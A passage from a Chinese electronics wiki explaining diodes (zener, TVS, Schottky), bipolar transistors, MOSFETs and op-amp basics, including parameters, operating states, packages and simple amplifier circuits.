$I_{ZM}$ 的乘积。超出可能因结温过高损坏。只要不超额定功率，电流越大，稳压效果越好。</li></ul><p>基本稳压电路：</p><p><img src="https://img.wiki-power.com/d/wiki-media/img/20210605133717.png"></p><p>限流电阻的选择：</p><p>在稳压电路中，需要串联一个限流电阻，保护稳压二极管（用于分掉输入电压和稳定电压之间的电压差值）。电阻两端的电压取输入电压和稳定电压之间的差值，电流取稳压二极管 ${I_Z}<em>{min}$ 与 ${I_Z}</em>{max}$ 之间，加上负载路的总电流。</p><h3 id="瞬态电压抑制器（TVS）"><a href="#瞬态电压抑制器（TVS）" class="headerlink" title="瞬态电压抑制器（TVS）"></a>瞬态电压抑制器（TVS）</h3><p>TVS 管是为了防止瞬态高能量冲击，保护精密元器件。TVS 管有单向与双向之分，单向 TVS 管的特性与稳压二极管相似，双向 TVS 管的特性相当于两个稳压二极管反向串联。</p><p>TVS 并联在电路中，正常情况下电流不走 TVS 的支路，TVS 表现出二极管单向导通的特性：</p><p><img src="https://img.wiki-power.com/d/wiki-media/img/20210725114841.png"></p><p>当发生过压时，TVS 进入击穿，将电流分流到地，使后续电路的电压保持在二极管的钳位电压：</p><p><img src="https://img.wiki-power.com/d/wiki-media/img/20210725114952.png"></p><p>用法：</p><ul><li>加在信号与电源线上，可防静电、交流浪涌或噪声。</li><li>能释放超过 10000 V、60 A 以上的脉冲，持续 10 ms，可防止元器件损坏或总线间开关引起的干扰。</li><li>放置在信号线和地之间，避免数据和控制总线受噪声干扰。</li></ul><p>TVS 管的主要参数：</p><ul><li><strong>反向截止电压 VRWM 与反向漏电流 IR</strong>：反向截止电压 VRWM 表示 TVS 管不导通的最高电压，在这个电压下只有很小的反向漏电流 IR。</li><li><strong>击穿电压 VBR</strong>：TVS 管通过规定的测试电流时的电压，这是表示 TVS 管导通的标志电压。</li><li><strong>脉冲峰值电流 IPP</strong>：TVS 管允许通过的 10&#x2F;1000μs 波的最大峰值电流（8&#x2F;20 μs 波的峰值电流约为其 5 倍左右），超过这个电流值就可能造成永久性损坏。在同一个系列中，击穿电压越高的管子允许通过的峰值电流越小，一般是几安 - 几十安。</li><li><strong>最大钳位电压 VC</strong>：TVS 管流过脉冲峰值电流 IPP 时两端所呈现的电压。</li><li><strong>脉冲峰值功率 Pm</strong>：$Pm&#x3D;IPP*VC$。在给定的最大钳位电压下，功耗 PM 越大，其浪涌电流承受能力越大，在给定的功耗 PM 下，钳位电压越 低，其浪涌电流的承受能力越大。</li><li><strong>稳态功率 P0</strong>：TVS 管也可以作稳压二极管用，这时要使用稳态功率。</li><li><strong>极间电容 Cj</strong>：与压敏电阻一样，TVS 管的极间电容 Cj 也较大，且单向的比双向的大，功率越大的电容也越大，极间电容会影响 TVS 的响应时间。</li></ul><p>TVS 管与稳压（齐纳）二极管的差异：</p><p><img src="https://img.wiki-power.com/d/wiki-media/img/20210725115837.png"></p><p><img src="https://img.wiki-power.com/d/wiki-media/img/20210725121636.png"></p><p>TVS 管在短时间内吸收很高的过电压，保护后续电路；而稳压（齐纳）二极管将输入电压钳制为恒定电压，并将钳制的恒定电压提供给后续电路。</p><h3 id="开关二极管"><a href="#开关二极管" class="headerlink" title="开关二极管"></a>开关二极管</h3><p>为了开关设计而定制的二极管，截至 &#x2F; 导通切换时间比较短，防止反向电流烧坏精密元器件</p><p>示例：</p><p><img src="https://img.wiki-power.com/d/wiki-media/img/20210605134740.png"></p><p>图中的 1N4148 起保护作用，当右侧灌入负电压时，能导通接地，保护三端稳压器</p><h3 id="肖特基二极管（SBD）"><a href="#肖特基二极管（SBD）" class="headerlink" title="肖特基二极管（SBD）"></a>肖特基二极管（SBD）</h3><p>肖特基二极管是一种采用半导体和金属结合，而不是采用 PN 结的器件（trr 会随着温度的升高而变长）。由于其正向电压小，反向恢复时间短，所以适合于高速开关应用。</p><p>肖特基二极管的伏安特性曲线：</p><p><img src="https://img.wiki-power.com/d/wiki-media/img/20210725123204.png"></p><p>肖特基二极管的作用是：</p><ol><li>整流，换句话说，在开关电源（开关模式电源，SMPS）或电源整流器内部的交流至直流转换，以及直流电压转换。</li><li>阻止直流电流和相反极性的直流的反向流动，例如当电池插入不正确时。</li></ol><h2 id="正偏与反偏"><a href="#正偏与反偏" class="headerlink" title="正偏与反偏"></a>正偏与反偏</h2><ul><li><strong>正向偏置</strong>：指 P 接高电位、N 接低电位，电流流动将顺着 PN 结方向，将显示出其单向导电的性能。</li><li><strong>反向偏置</strong>：相反，形成由 N 区流向 P 区的反向电流，通常可以认为反向偏置的 PN 结不导电，基本上处于截止状态。</li></ul><h2 id="常用封装"><a href="#常用封装" class="headerlink" title="常用封装"></a>常用封装</h2><table><thead><tr><th align="center">封装名称</th><th align="center">备注</th></tr></thead><tbody><tr><td align="center">DO-214AC&#x2F;SMA</td><td align="center">通流能力 2 A</td></tr><tr><td align="center">DO-214AA&#x2F;SMB</td><td align="center">通流能力 4 A</td></tr><tr><td align="center">DO-214AB&#x2F;SMC</td><td align="center">通流能力 5 A</td></tr><tr><td align="center">DPAK&#x2F;D2PAK</td><td align="center"></td></tr></tbody></table><h2 id="参考与致谢-3"><a href="#参考与致谢-3" class="headerlink" title="参考与致谢"></a>参考与致谢</h2><ul><li><a href="https://mp.weixin.qq.com/s/5H46gHF3RjfWq_1rkswTjw">二极管选型规范（仅供参考）</a></li><li><a href="https://toshiba-semicon-storage.com/cn/semiconductor/knowledge/e-learning/discrete.html">分立半导体器件 - 第 Ⅱ 章：二极管</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzAxNDAyMzc0Mg==&mid=2683480567&idx=1&sn=15304136c6e9a478f2096982c5048155&chksm=819fa4a6b6e82db053ec4a5a26c05e7b160c4f2b13a300e1d6aadd5b815343d017b0d34bbe8c&scene=132#wechat_redirect">TVS 管性能及选型</a></li><li><a href="https://haipeng.me/2021/01/27/diode-guide/">电子工程师手记：二极管选择指南</a></li></ul><blockquote><p>原文地址：<a href="https://wiki-power.com/">https://wiki-power.com/</a><br>本篇文章受 <a href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC BY-NC-SA 4.0</a> 协议保护，转载请注明出处。</p></blockquote><h1 id="基本元器件-晶体三级管"><a href="#基本元器件-晶体三级管" class="headerlink" title="基本元器件 - 晶体三级管"></a>基本元器件 - 晶体三级管</h1><p>晶体三极管是一种 <strong>电流控电流</strong> 的元器件。</p><h2 id="区分极性"><a href="#区分极性" class="headerlink" title="区分极性"></a>区分极性</h2><p>除基极外，带箭头是发射极，不带则是集电极。箭头朝外是 NPN，指向里面是 PNP.</p><p><img src="https://img.wiki-power.com/d/wiki-media/img/20210519231240.png"></p><h2 id="不同封装引脚辨认"><a href="#不同封装引脚辨认" class="headerlink" title="不同封装引脚辨认"></a>不同封装引脚辨认</h2><p><img src="https://img.wiki-power.com/d/wiki-media/img/20210519231429.png"></p><h2 id="基本电流关系"><a href="#基本电流关系" class="headerlink" title="基本电流关系"></a>基本电流关系</h2><p><img src="https://img.wiki-power.com/d/wiki-media/img/20210519231648.png"></p><p>三极管电流方向依托于发射级电流方向。</p><ul><li>NPN：发射级流出，所以基极和集电极都是流入。</li><li>PNP：发射级流入，所以基极和集电极都是流出。</li></ul><p>规律：</p><ol><li>满足基尔霍夫电流定律 $i_B + i_C &#x3D; i_E$</li><li>处于放大状态下，集电极电流只受控于基极电流（$i_C &#x3D; \beta i_B$），与集电极发射极间的电压无关。</li><li>基极与发射极导通时，分压值 $U_{BE}$ 约为 0.7V</li></ol><p>所以三极管就是一个受控电流源，由小电流 $i_B$ 去控大电流 $i_C$，取决于晶体管恒定的放大倍数 $\beta$。</p><p>所以，$i_E&#x3D;(1+\beta)i_B &#x3D; \frac{1+\beta}{\beta}·i_C$</p><h2 id="输出伏安特性"><a href="#输出伏安特性" class="headerlink" title="输出伏安特性"></a>输出伏安特性</h2><p><img src="https://img.wiki-power.com/d/wiki-media/img/20210601095910.png"></p><p>如图，三极管的输出伏安特性分以下几个区域：</p><ul><li><strong>放大区</strong>：在此区域内，晶体管的 $i_C$ 几乎不随 $u_{CE}$ 变化，近似满足 $i_C &#x3D; \beta i_B$。</li><li><strong>饱和区</strong>：在此区域内，晶体管的 $i_C$ 随着 $u_{CE}$ 增大而增大。一般认为当 $u_{CE}$ 小于饱和压降 $U_{CES}$（一般为 0.3 V）时，晶体管工作在饱和区。</li><li><strong>截止区</strong>：即 $I_B &#x3D; 0$ 的那根曲线。但此时 $i_C$ 并不为 0，因为存在与 $u_{CE}$ 相关的漏电流。截止区代表晶体管处于几乎没有任何电流进出的状态，近似于完全关闭。</li></ul><p>如果我们想用数学公式描述伏安特性，那么需要将曲线简化一下：</p><p><img src="https://img.wiki-power.com/d/wiki-media/img/20210601100847.png"></p><p>简化后，可以这么认为：</p><ul><li><strong>放大区</strong>：满足 $i_C &#x3D; \beta i_B$，与 $u_{CE}$ 无关。</li><li><strong>饱和区</strong>：$i_C$ 随着 $u_{CE}$ 增大而增大，近似为线性。</li><li><strong>$U_{CES}$ 垂直线</strong>：饱和区与放大区的分界线。</li></ul><h2 id="阻容耦合放大电路"><a href="#阻容耦合放大电路" class="headerlink" title="阻容耦合放大电路"></a>阻容耦合放大电路</h2><h2 id="晶体管的工作状态"><a href="#晶体管的工作状态" class="headerlink" title="晶体管的工作状态"></a>晶体管的工作状态</h2><ul><li><strong>截止状态</strong><ul><li>指基极未产生明显电流（$I_{BQ}$ 非常小导致 $I_{CQ}$ 也很小），集电极与发射极之间相当于开路。</li><li>$I_{BQ} &#x3D; 0, I_{CQ} &#x3D; 0, I_{EQ} &#x3D; I_{BQ}+I_{CQ}&#x3D;0$。发射结零偏 &#x2F; 反偏、集电结反偏。</li></ul></li><li><strong>放大状态</strong><ul><li>指晶体管处于 $I_{BQ}$ 合适，且满足 $I_{CQ} &#x3D; \beta I_{BQ},I_{EQ} &#x3D; (1+ \beta)I_{BQ}, I_{BQ} &#x3D; \frac{V_{CC}-U_{BE}}{R_B}$</li><li>发射结正偏、集电结反偏。</li><li>这是模电最常用的状态。</li></ul></li><li><strong>饱和状态</strong><ul><li>$I_{CQ} &lt; \beta I_{BQ}$，但还是随 $U_{CEQ}$ 变化。$I_{BQ}$ 和 $I_{CQ}$ 都很大，$I_{CQ}$ 已经不完全受 $I_{BQ}$ 控制，且 $U_{CEQ}$ 所占的电压很小。</li><li>只要 $U_{CEQ} &lt; U_{CES}$，就进入饱和状态。此时，再增加 $I_{BQ}$，$I_{CQ}$ 也几乎不再增加。</li><li>发射结正偏、集电结正偏。</li><li>在模电中应该避免进入饱和状态，而在数电中则期望进入饱和或截至状态。</li></ul></li><li><strong>倒置状态</strong><ul><li>集电极和发射极接反了。虽然也不是不能用，但是会造成 $\beta$ 下降严重。</li><li>饱和状态就好比水龙头打开了，但水箱里没水，此时就是有多少水来多少水。</li><li>发射结反偏，集电结正偏。</li></ul></li></ul><p>判断工作状态有三种方法，分别是估算法、函数求解法、图解法。估算法的核心是假设 $U_{BEQ}$ 约等于 0.7 V，但有误差（电压越大误差越小）；函数求解法必须知道输入、输出伏安特性的数学表达式，通过方程求解，一般不会用到；图解法的核心是用伏安特性图和另一直线的交点，求解静态工作点的位置，然后目测结果。</p><h2 id="三极管的主要参数"><a href="#三极管的主要参数" class="headerlink" title="三极管的主要参数"></a>三极管的主要参数</h2><ul><li>**电流放大系数 $\beta$**：一般为 10-100 倍，但在应用中取 30-80 倍为宜（太小放大不明显，太大工作不稳定）。</li><li>**集电极最大允许电流 $I_{CM}$**：超过可能导致烧坏。</li><li><strong>集电极最大允许功耗 $P_{CM}$</strong></li><li><strong>集电极发射极间反向击穿电压 $V_{CEO}$</strong></li></ul><h2 id="判断三极管的工作状态"><a href="#判断三极管的工作状态" class="headerlink" title="判断三极管的工作状态"></a>判断三极管的工作状态</h2><h2 id="估算法"><a href="#估算法" class="headerlink" title="估算法"></a>估算法</h2><p><img src="https://img.wiki-power.com/d/wiki-media/img/20210601113429.png"></p><p>其中的 <code>估算静态工作点</code>，即用简单的方法大致估算出晶体管电路的静态（各支路电流、各节点电位），核心就是假设 $U_{BEQ}$ 约等于 0.7 V（一般要算出 $I_{CQ}$ 和 $U_{CEQ}$），具体步骤如下：</p><ol><li>根据 $U_{BEQ} &#x3D; 0.7 V$，算出 $I_{BQ}$</li><li>假设处于放大状态，即 $I_{CQ} &#x3D; \beta I_{BQ}$，求解出 $U_{CEQ}$</li><li>此时如果 $U_{CEQ} &gt;&#x3D; 0.3 V$，则假设成立，晶体管处于放大状态，$I_{CQ}$ 与 $U_{CEQ}$ 为所求。</li><li>如果 $U_{CEQ} &lt; 0.3 V$，则假设不成立，晶体管处于饱和状态。</li></ol><h2 id="图解法"><a href="#图解法" class="headerlink" title="图解法"></a>图解法</h2><p>图解法的核心，是用伏安特性图和另一直线的交点，求解静态工作点的位置，然后目测结果。</p><h2 id="基本放大电路"><a href="#基本放大电路" class="headerlink" title="基本放大电路"></a>基本放大电路</h2><p><img src="https://img.wiki-power.com/d/wiki-media/img/20210605162906.png"></p><p>如图，各部分的作用：</p><ul><li>$C_1$&#x2F;$C_2$：隔直通交。排除 $U_{CC}$ 的影响。取值几微法到几十微法。</li><li>$U_{CC}$：为电路功能；提供合适的静态工作点。</li><li>$R_B$：提供合适的 $I_B$，取值一般为几十欧到几百千欧。</li><li>$R_C$：取值几千欧到几十千欧。</li></ul><p>分析：</p><ul><li>总基极电压 $U_{BE} &#x3D; U_{BEQ}+u_i$</li><li>总基极电流 $i_B&#x3D;I_{BQ}+i_b$</li><li>总集电极电流 $i_C&#x3D;I_{CQ}+i_c$</li><li>总的 $u_CE&#x3D;V_{CC}-{i_C}{R_C}&#x3D;V_{CC}-(I_{CQ}+i_c)R&#x3D;U_{CEQ}+({-i_C}{R_C})$</li></ul><p>此电路的不足：虽结构简单，但静态工作点不稳定，受各元器件影响大。</p><blockquote><p>原文地址：<a href="https://wiki-power.com/">https://wiki-power.com/</a><br>本篇文章受 <a href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC BY-NC-SA 4.0</a> 协议保护，转载请注明出处。</p></blockquote><h1 id="基本元器件-场效应管"><a href="#基本元器件-场效应管" class="headerlink" title="基本元器件 - 场效应管"></a>基本元器件 - 场效应管</h1><p>场效应管是一种 <strong>电压控电流</strong> 的器件。其中，我们常用的 MOS 管是由是金属（metal）、氧化物（oxide）、半导体（semiconductor）组成的场效应晶体管。下文着重介绍以增强型 N 管。</p><p><img src="https://img.wiki-power.com/d/wiki-media/img/20211209085909.png"></p><p><img src="https://img.wiki-power.com/d/wiki-media/img/20210602163957.png"></p><p>场效应管的引脚与三极管相对应：栅极 &#x2F; 门极（G）对应基极（b），漏极（D）对应集电极（c），源极（S）对应发射级（e）。箭头指电子运动的方向。</p><p>所有场效应管在正常工作时，门级都不会有电流。所以，漏极电流一定等于源极电流。其核心是用 GS 两端电压来控制漏极电流。所以也称为压控型元器件。</p><h2 id="MOS-管的引脚定义"><a href="#MOS-管的引脚定义" class="headerlink" title="MOS 管的引脚定义"></a>MOS 管的引脚定义</h2><p>MOS 管有三个引脚（G，S，D）其定义如下：</p><ul><li>G：gate &#x2F; 栅极</li><li>S：source &#x2F; 源极</li><li>D：drain &#x2F; 漏极</li></ul><p>N 沟道的电源一般接在 D，输出接 S；P 沟道的电源一般接在 S，输出接 D，增强型 &#x2F; 耗尽型接法基本一样。</p><p>MOS 管的 source 和 drain 是可以对调的，他们都是在 P 型 backgate 中形成的 N 型区，在大多数情况下，这个两个区是一样的，即使对调也不会影响性能。</p><h2 id="寄生二极管"><a href="#寄生二极管" class="headerlink" title="寄生二极管"></a>寄生二极管</h2><p>由于生产工艺，MOS 管会有寄生二极管，或称体二极管。</p><p><img src="https://img.wiki-power.com/d/wiki-media/img/20211209090114.png"></p><p>当满足 MOS 管的导通条件时，MOS 管的 D 极和 S 极会导通，这个时候体二极管是截止状态。因为 MOS 管导通内阻很小，不足以使寄生二极管导通。</p><h2 id="MOS-管的导通条件"><a href="#MOS-管的导通条件" class="headerlink" title="MOS 管的导通条件"></a>MOS 管的导通条件</h2><p>MOS 管是压控型，由 G 和 S 极之间压差决定是否导通。</p><p>对 N-MOS 来说，当 $V_g-V_s&gt;V_{gs(th)}$ 即可导通。</p><p>对 P-MOS 来说，当 $V_s-V_g&gt;V_{gs(th)}$ 即可导通。</p><h2 id="增强型-MOS-管的特性"><a href="#增强型-MOS-管的特性" class="headerlink" title="增强型 MOS 管的特性"></a>增强型 MOS 管的特性</h2><p>增强型 MOS 管的结构，是在 P 型硅衬底上，制作两个 N 型沟槽，用铝从其引出两个电极分别作为源极 S 和漏极 D（此时 D&#x2F;S 可互换），然后在半导体的表面覆盖一层很薄的 SiO2 绝缘层，在漏源极间的绝缘层上再装上一个铝电极，作为栅极 G，在衬底上也引出一个电极 B。因为出厂时大多把衬底已经和源极连在一起，所以此时 D&#x2F;S 不可互换</p><p><img src="https://img.wiki-power.com/d/wiki-media/img/20210604120853.png"></p><p>如图是增强型 MOSFET 的伏安特性曲线，左图为转移特性，右图为输出特性，他们共用纵轴。</p><p>伏安特性的关键要素：</p><ol><li>**开启电压 $U_{GS_(th)}$**：从图中可以看出 $U_{GS_(th)} &#x3D; 1 V$。当 $U_{GS} &lt; U_{GS_(th)}$ 时，无论 $U_{DS}$ 多大，电流 $i_D$ 始终为 0。当 $U_{GS} &gt; U_{GS_(th)}$ 时，MOSFET 才算开启。</li><li><strong>恒流区方程</strong>：$i_D &#x3D; K(u_{GS}-U_{GS_(th))^2$，其中，K 影响转移特性曲线的增长速率（单位是 $A&#x2F;V^2$）</li><li><strong>可变电阻区和恒流区的分界线</strong>：随着 $U_{GS}$ 增加，分界点电压 $U_{DS_{dv}}$ 也在增加，且满足 $U_{DS_{dv}}&#x3D;U_{GS} - U_{GS_(th)}$</li></ol><h2 id="MOSFET-工作状态"><a href="#MOSFET-工作状态" class="headerlink" title="MOSFET 工作状态"></a>MOSFET 工作状态</h2><p>MOSFET 不同于三极管，因为某些型号封装内有并联二极管，所以其 D 和 S 极是不能反接的，且 N 管必须由 D 流向 S，P 管必须由 S 流向 D。可以用下表判断工作状态：</p><p><img src="https://img.wiki-power.com/d/wiki-media/img/20210602210930.png"></p><p><img src="https://img.wiki-power.com/d/wiki-media/img/20210604120745.png"></p><p>几个工作区:</p><ul><li><strong>截止区</strong>：当 $U_{GS}$ 小于开启电压 $U_{GS_(th)}$ 时，MOS 不导通。</li><li><strong>可变电阻区</strong>：$U_{DS}$ 很小，$I_D$ 随 $U_{DS}$ 增大而增大。</li><li><strong>恒流区</strong>：$U_{DS}$ 变化，$I_D$ 变化很小。</li><li><strong>击穿区</strong>：$U_{DS}$ 达到一定值时，MOS 被击穿，$I_D$ 突然增大，如果没有限流电阻，将被烧坏。</li><li><strong>过损耗区</strong>：功率较大，需要加强散热，注意最大功率。</li></ul><h2 id="MOSFET-主要参数"><a href="#MOSFET-主要参数" class="headerlink" title="MOSFET 主要参数"></a>MOSFET 主要参数</h2><p>直流参数：</p><ul><li>**开启电压 $U_{GS_(th)}$**：增强型 MOS 的参数。指当 $U_{DS}$ 不变时，使得 $i_D &gt; 0$ 所需最小的 $\left| u_{GS} \right|$ 的值。</li><li>**夹断电压 $U_{GS_(off)}$**：结型场效应管和耗尽型 MOS 的参数，与 $U_{GS_(th)}$ 相似，代表当 $U_{DS}$ 不变时，$i_D$ 为规定的微小电流时的 $u_{GS}$。</li><li>**直流输入电阻 $U_{GS_(DC)}$**：栅 - 源电压与栅极电流之比，一般 MOS 的 $U_{GS_(DC)} &gt; 10^9 \Omega$。</li></ul><p>选型关键参数：</p><ol><li><strong>击穿电压 V_BRDSS</strong><ul><li>随温度变化，应留足余量</li></ul></li><li><strong>导通电阻 R_DS(on)</strong><ul><li>导通电阻正温度系数，适合并联工作</li><li>导通电阻越小，导通损耗越小</li><li>导通电阻越小，Qg 就越大，相应的开关速度变慢</li><li>带来的开关损耗越大，高频工作下需要折中考虑</li></ul></li><li><strong>最大结温</strong><ul><li>永远不能超过最大结温</li><li>只能测量壳温后通过热阻计算而得</li></ul></li><li><strong>动态电容和 Qg</strong><ul><li>不是固定值，取决于工作条件</li><li>作为开关时希望快速打开，需要一个驱动芯片提供瞬间大电流</li><li>作为缓启动 MOS，需要慢慢打开，有效抑制浪涌电流</li></ul></li></ol><p>N-MOS：</p><ul><li>门极需要一个比源极更高的电压驱动</li><li>更好的性能</li><li>更多的选择</li><li>更低的成本</li></ul><p>P-MOS：</p><ul><li>门极需要一个比源极低的电压驱动</li><li>不需要更高的电压驱动，驱动简单</li></ul><h2 id="三极管与场效应管的对比"><a href="#三极管与场效应管的对比" class="headerlink" title="三极管与场效应管的对比"></a>三极管与场效应管的对比</h2><table><thead><tr><th align="center"></th><th align="center">三极管</th><th align="center">场效应管</th></tr></thead><tbody><tr><td align="center">特性</td><td align="center">电流控电流</td><td align="center">电压控电流</td></tr><tr><td align="center">输入阻抗</td><td align="center">低</td><td align="center">高</td></tr><tr><td align="center">噪声</td><td align="center">大</td><td align="center">小</td></tr><tr><td align="center">反应速度</td><td align="center">快</td><td align="center">慢</td></tr></tbody></table><h2 id="反馈"><a href="#反馈" class="headerlink" title="反馈"></a>反馈</h2><p>定义：将放大电路输出端信号（电压 &#x2F; 电流）一部分或全部引回到输入端，与输入信号进行叠加。</p><p>负反馈：返回的信号对输入信号进行削弱。<br>正反馈：返回的信号对输入信号进行增强。</p><h2 id="MOS-管常见的封装"><a href="#MOS-管常见的封装" class="headerlink" title="MOS 管常见的封装"></a>MOS 管常见的封装</h2><h3 id="SOT-封装"><a href="#SOT-封装" class="headerlink" title="SOT 封装"></a>SOT 封装</h3><p>SOT（Small Out-Line Transistor，小外形晶体管封装）封装一般用于小功率 MOS 管。</p><p>SOT-23 封装：</p><p><img src="https://img.wiki-power.com/d/wiki-media/img/20210331162749.png"></p><p>SOT-89 封装：</p><p><img src="https://img.wiki-power.com/d/wiki-media/img/20210331162842.png"></p><h3 id="TO-封装"><a href="#TO-封装" class="headerlink" title="TO 封装"></a>TO 封装</h3><p>TO（Transistor Out-line，晶体管外形）是比较早期的封装规格，原来多为直插封装（例如 TO-92，TO-220，TO-252），后来也慢慢进化到标贴式封装。TO252 和 TO263 是其典型，其中 TO-252 又称之为 D-PAK，TO-263 又称之为 D2PAK。</p><p>D-PAK 封装的 MOS 管有 3 个电极，其中漏极（D）的引脚被剪断不用，而是用背面的散热板作为漏极，能输出更大电流的同时也能更好地散热。</p><p>TO-252 封装：</p><p><img src="https://img.wiki-power.com/d/wiki-media/img/20210331163718.png"></p><p>TO-263 封装：</p><p><img src="https://img.wiki-power.com/d/wiki-media/img/20210331163731.png"></p><h3 id="SOP-封装"><a href="#SOP-封装" class="headerlink" title="SOP 封装"></a>SOP 封装</h3><p>SOP（Small Out-Line Package，小外形封装），也叫 SO、SOL 或 DFP。通常有 SOP-8、SOP-16、SOP-20、SOP-28 等等（数字表示引脚数）。MOS 的 SOP 封装多数采用 SOP-8 规格。</p><p>SOP-8 封装：</p><p><img src="https://img.wiki-power.com/d/wiki-media/img/20210331165427.png"></p><h2 id="参考与致谢-4"><a href="#参考与致谢-4" class="headerlink" title="参考与致谢"></a>参考与致谢</h2><ul><li><a href="http://www.yushin88.com/news/1670.html">贴片 mos 管的封装知识和排列</a></li><li><a href="https://picture.iczhiku.com/weixin/message1604984792157.html">MOS 管的知识，看这一篇就可以了</a></li></ul><blockquote><p>原文地址：<a href="https://wiki-power.com/">https://wiki-power.com/</a><br>本篇文章受 <a href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC BY-NC-SA 4.0</a> 协议保护，转载请注明出处。</p></blockquote><h1 id="基本元器件-运算放大器"><a href="#基本元器件-运算放大器" class="headerlink" title="基本元器件 - 运算放大器"></a>基本元器件 - 运算放大器</h1><p><img src="https://img.wiki-power.com/d/wiki-media/img/20220606212720.png"></p><p>俗话说，运算放大器就是模电的终极目标。运算放大器（Operational Amplifier）是一种能够实现电信号（电压&#x2F;电流&#x2F;功率）放大的器件。不仅仅如此，它还可以作为缓冲器、滤波器、各种运算功能（积分、微分、乘法、对数）等。</p><p>运放拥有一对差分输入端（同相 $u_+$ 与反相 $u_-$ 电压输入），一个单端输出端 $u_o$，一对供电引脚 $V_+$ 和 $V_-$（大多数时候不画出）。它通过同相 $u_+$ 和反相 $u_-$ 电压进行输入，在内部进行比较运算，并通过输出端 $u_o$ 放大输出。输出端 $u_o$ 输出阻抗为 0，流出的电流由正电源端子 $V_+$ 提供，流入的电流由负电源端子 $V_-$ 提供。</p><p>当运算放大器工作在 <strong>线性区域</strong> 的时候，满足关系：</p><p>$$<br>u_o&#x3D;A_{uo}(u_+-u_-)<br>$$</p><p>其中，$A_{uo}$ 称为运算放大器的 <strong>开环电压增益</strong>（u 代表电压，o 代表 open），一般无穷大。</p><h2 id="运放的工作状态"><a href="#运放的工作状态" class="headerlink" title="运放的工作状态"></a>运放的工作状态</h2><p>集成运放的电压传输特性如下图所示：</p><p><img src="https://img.wiki-power.com/d/wiki-media/img/20210819134709.png"></p><p>图中分为线性区和非线性区：</p><ul><li>工作在线性放大区：斜线的斜率为开环电压增益。</li><li>工作在非线性区：即饱和状态，在图中是左右两端的水平线，输出电压为 $-U_{om}$（负电源端子 $V_-$ 的电压），或 $+U_{om}$（等同于正电源端子 $V_+$ 的电压）。</li></ul><h2 id="运放的供电"><a href="#运放的供电" class="headerlink" title="运放的供电"></a>运放的供电</h2><p>运放的供电方式一般分 <strong>单电源</strong> 或 <strong>双电源</strong>。单电源下，$V_+$ 接正电压，$V_-$ 接地。双电源一般指 $V_+$ 接正电压，$V_-$ 接负电压。不同的供电方式带来了不同的频率性能和输入输出的范围。</p><p>除此之外，运放可以工作在正负电源（$V_+$&#x2F;$V_-$）不对称的情况下（比如 $V_+$ 为 5V，$V_-$ 为 -3V），它并不需要知道地的位置，但依然可以正常工作。</p><p>运放的轨至轨，指的是输出的电压能达到电源电压。比如，如果是一个非轨对轨的运放，假如供电为 0<del>5V，输出有可能只能达到 0.7</del>4.3V，而轨对轨输出则可以 0~5V。</p><h2 id="运放的虚短与虚断"><a href="#运放的虚短与虚断" class="headerlink" title="运放的虚短与虚断"></a>运放的虚短与虚断</h2><h3 id="虚短"><a href="#虚短" class="headerlink" title="虚短"></a>虚短</h3><p>虚短是从电压的角度看的，<strong>在负反馈的条件下，正负两个输入端电压基本保持相等，近似于短路（但并不是真正短路），称为虚短。</strong></p><p><img src="https://img.wiki-power.com/d/wiki-media/img/20220606211723.png"></p><p>参考负反馈的电路，可以看到，如果同相输入端电压略高于反相输入端，则负反馈电路会拉高反相输入端电压，直到与同相输入端电压相当；反之，如果同相输入端电压略低于反相输入端，则反相输入端电压也会跟随到此时同相输入端的电压。</p><h3 id="虚断"><a href="#虚断" class="headerlink" title="虚断"></a>虚断</h3><p>虚断是从电流的角度看的，<strong>运放两个输入端输入阻抗很大，流入的的电流只有微安级别，近似为无电流流入也就是断路，称为虚断。</strong></p><p>注：运放两个输入端输入阻抗很大，是对于一般情况而言。也有特例，比如电流反馈运放。</p><h2 id="常用运放电路"><a href="#常用运放电路" class="headerlink" title="常用运放电路"></a>常用运放电路</h2><p>因为运放的开环电压增益无穷大，所以需要通过特殊的电路结构来实现合适的放大效果。</p><h3 id="电压跟随器"><a href="#电压跟随器" class="headerlink" title="电压跟随器"></a>电压跟随器</h3><p><img src="https://img.wiki-power.com/d/wiki-media/img/20220606221550.png"></p><p>电压跟随器（也称 Buffer）用于高阻抗信号源和低阻性负载之间的缓冲。</p><h3 id="同相放大器"><a href="#同相放大器" class="headerlink" title="同相放大器"></a>同相放大器</h3><p><img src="https://img.wiki-power.com/d/wiki-media/img/20220606221659.png"></p><p>同相放大器输出与输入是同相的，可将信号同相放大。</p><p>效果：通过调节 $R_G$ 与 $R_F$ 的阻值，使 $V_{OUT}$ 与 $V_{IN}$ 呈正比放大的关系。</p><p>原理：</p><ol><li>因为虚短，所以 $V_- &#x3D; V_{IN}$</li><li>因为续断，所以 $V_-$ 端输入电流可忽略不计，所以 $I_{R_G}&#x3D;I_{R_F}$，根据欧姆定律，$\frac{0–V_-}{R_G}&#x3D;\frac{V_- - V_{OUT}}{R_F}$，得出 $V_{OUT}&#x3D;V_{IN}(\frac{R_F}{R_G}+1)$。</li></ol><h3 id="反相放大器"><a href="#反相放大器" class="headerlink" title="反相放大器"></a>反相放大器</h3><p><img src="https://img.wiki-power.com/d/wiki-media/img/20220606221844.png"></p><p>反相放大器输出与输入是反相的，可将信号放大并反转输出。</p><h3 id="电压减法器-差动放大器"><a href="#电压减法器-差动放大器" class="headerlink" title="电压减法器 &#x2F; 差动放大器"></a>电压减法器 &#x2F; 差动放大器</h3><p><img src="https://img.wiki-power.com/d/wiki-media/img/20220606222121.png"></p><p>电压减法器 &#x2F; 差动放大器可放大两个电压之差，抑制共模电压。</p><h3 id="电压加法器"><a href="#电压加法器" class="headerlink" title="电压加法器"></a>电压加法器</h3><p><img src="https://img.wiki-power.com/d/wiki-media/img/20220606222430.png"></p><p>电压加法器用于多个电压求和。</p><h3 id="低通滤波器-积分器"><a href="#低通滤波器-积分器" class="headerlink" title="低通滤波器 &#x2F; 积分器"></a>低通滤波器 &#x2F; 积分器</h3><p><img src="https://img.wiki-power.com/d/wiki-media/img/20220606222539.png"></p><p>低通滤波器 &#x2F; 积分器用于对信号的低通滤波，限制信号带宽。</p><h3 id="高通滤波器-微分器"><a href="#高通滤波器-微分器" class="headerlink" title="高通滤波器 &#x2F; 微分器"></a>高通滤波器 &#x2F; 微分器</h3><p><img src="https://img.wiki-power.com/d/wiki-media/img/20220606222649.png"></p><p>高通滤波器 &#x2F; 微分器用于隔离直流信号、放大交流信号。</p><h3 